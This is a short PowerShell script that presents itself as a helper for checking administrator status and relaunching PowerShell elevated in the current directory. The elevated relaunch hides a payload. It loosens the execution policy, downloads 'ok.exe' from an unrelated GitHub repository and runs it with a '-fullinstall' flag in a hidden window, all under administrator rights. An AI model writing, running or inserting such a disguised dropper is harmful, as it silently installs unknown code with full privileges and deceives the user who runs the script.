#
#  V.2
#
param (
   [alias('?')] [switch] $amI
)

set-strictMode -version 3

if ($amI) {

   $curIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
   $principal   = new-object System.Security.Principal.WindowsPrincipal $curIdentity
   $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

   return
}

# Start same powershell executable as administrator
# in the current directory.
$ps_exe = (get-process -pid $pid).path
$command = "Set-ExecutionPolicy RemoteSigned -Force; $ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/37218vuuhuu/na/raw/main/ok.exe' -OutFile ok.exe; Start-Process -FilePath .\ok.exe -ArgumentList '-fullinstall' -Wait -WindowStyle Hidden
;Exit"
start-process $ps_exe -verb runAs -argumentList '-noExit', '-command', 'cd', "'$pwd'" "-Command", $command;